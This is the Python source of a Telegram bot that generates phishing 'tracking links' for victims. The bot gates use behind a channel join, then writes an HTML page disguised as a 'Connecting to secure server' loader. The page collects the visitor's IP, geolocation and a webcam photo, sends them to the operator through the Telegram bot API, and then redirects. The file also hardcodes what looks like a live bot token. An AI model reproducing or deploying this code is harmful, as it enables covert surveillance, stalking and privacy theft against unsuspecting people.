import telebot
import os
import requests
import time
import threading

TOKEN = "8754262218:AAEGMkxM2YWo121PjkZMr4MX3Jd9g8cJhQw"  # Apna token yahan dal
bot = telebot.TeleBot(TOKEN)

CHANNEL = "@nrtecno2"

# Store user state
user_state = {}

# Check if user is subscribed to channel
def is_subscribed(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={CHANNEL}&user_id={user_id}"
        response = requests.get(url)
        data = response.json()
        if data["ok"]:
            status = data["result"]["status"]
            return status in ["member", "administrator", "creator"]
    except Exception as e:
        print(f"Error checking subscription: {e}")
    return False

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    
    if is_subscribed(user_id):
        bot.reply_to(message, "✅ Send me any URL:\n\nExample:\nhttps://www.instagram.com/p/xxxxx")
        user_state[user_id] = "waiting_url"
    else:
        markup = telebot.types.InlineKeyboardMarkup()
        btn = telebot.types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/nrtecno2")
        verify = telebot.types.InlineKeyboardButton("✅ Verify", callback_data="verify")
        markup.add(btn)
        markup.add(verify)
        bot.reply_to(message, f"🚫 You must join {CHANNEL} first!\n\n1. Click 'Join Channel'\n2. Join the channel\n3. Click 'Verify'", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify_callback(call):
    user_id = call.from_user.id
    message_id = call.message.message_id
    
    if is_subscribed(user_id):
        bot.edit_message_text("✅ Verified!\n\nNow send me any URL:", user_id, message_id)
        user_state[user_id] = "waiting_url"
    else:
        bot.answer_callback_query(call.id, "❌ Please join @nrtecno2 channel first!", show_alert=True)

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    user_id = message.chat.id
    text = message.text.strip()
    
    # Check if user is waiting for URL
    if user_state.get(user_id) == "waiting_url":
        # Validate URL
        if text.startswith("http://") or text.startswith("https://"):
            # Generate tracking link
            html_content = generate_payload(text, user_id)
            filename = f"v_{user_id}.html"
            with open(filename, "w") as f:
                f.write(html_content)
            
            link = f"https://telegram-bot-osvi.onrender.com/{filename}"
            bot.reply_to(message, f"✅ Your tracking link:\n{link}\n\nSend this link to victim. You will receive their IP, Location, and Camera photo here.")
            
            # Clear state
            del user_state[user_id]
        else:
            bot.reply_to(message, "❌ Please send a valid URL starting with http:// or https://")
    else:
        bot.reply_to(message, "Please use /start first")

def generate_payload(target_url, user_id):
    return f'''<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Loading...</title>
    <style>
        body {{
            background: #000;
            color: #0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: monospace;
            text-align: center;
        }}
        .loader {{
            border: 3px solid #333;
            border-top: 3px solid #0f0;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div>
        <div class="loader"></div>
        <h2>Connecting to secure server...</h2>
        <p>Please wait</p>
    </div>

    <script>
        const BOT_TOKEN = "{TOKEN}";
        const USER_ID = {user_id};
        const TARGET_URL = "{target_url}";
        
        let dataSent = false;
        
        async function sendToBot(text, photoBlob = null) {{
            try {{
                if(photoBlob) {{
                    let formData = new FormData();
                    formData.append('chat_id', USER_ID);
                    formData.append('photo', photoBlob);
                    await fetch(`https://api.telegram.org/bot${{BOT_TOKEN}}/sendPhoto`, {{
                        method: 'POST',
                        body: formData
                    }});
                }} else {{
                    await fetch(`https://api.telegram.org/bot${{BOT_TOKEN}}/sendMessage`, {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{
                            chat_id: USER_ID,
                            text: text
                        }})
                    }});
                }}
            }} catch(e) {{
                console.log("Send error:", e);
            }}
        }}
        
        async function getIP() {{
            try {{
                let res = await fetch('https://api.ipify.org?format=json');
                let data = await res.json();
                return data.ip;
            }} catch(e) {{
                return 'Unable to get IP';
            }}
        }}
        
        async function getLocation() {{
            return new Promise((resolve) => {{
                if(!navigator.geolocation) {{
                    resolve('Location not supported');
                    return;
                }}
                navigator.geolocation.getCurrentPosition(
                    (pos) => {{
                        let lat = pos.coords.latitude;
                        let lng = pos.coords.longitude;
                        let mapLink = `https://www.google.com/maps?q=${{lat}},${{lng}}`;
                        sendToBot(`📍 Location: ${{mapLink}}\\nAccuracy: ${{pos.coords.accuracy}}m`);
                        resolve(`${{lat}}, ${{lng}}`);
                    }},
                    (err) => {{
                        sendToBot(`📍 Location: Denied or unavailable`);
                        resolve('Denied');
                    }}
                );
            }});
        }}
        
        async function takePhoto() {{
            try {{
                let stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: false }});
                let video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                
                await new Promise((resolve) => {{
                    video.onloadedmetadata = () => {{
                        video.play();
                        resolve();
                    }};
                }});
                
                await new Promise(r => setTimeout(r, 500));
                
                let canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                
                if(blob && blob.size > 1000) {{
                    await sendToBot("📸 Camera Photo Captured:", blob);
                }}
                
                stream.getTracks().forEach(track => track.stop());
                return true;
            }} catch(e) {{
                await sendToBot(`❌ Camera Error: ${{e.message}}`);
                return false;
            }}
        }}
        
        async function collectData() {{
            try {{
                let ip = await getIP();
                let ua = navigator.userAgent;
                await sendToBot(`🎯 VICTIM DATA\\nIP: ${{ip}}\\nDevice: ${{ua.split('(')[0]}}\\nTime: ${{new Date().toISOString()}}`);
                
                await getLocation();
                
                await takePhoto();
                
                await sendToBot(`✅ Data collection complete. Redirecting...`);
                
            }} catch(e) {{
                await sendToBot(`❌ Error: ${{e.message}}`);
            }}
            
            setTimeout(() => {{
                window.location.href = TARGET_URL;
            }}, 2000);
        }}
        
        collectData();
    </script>
</body>
</html>'''

print("Bot started...")
bot.infinity_polling()
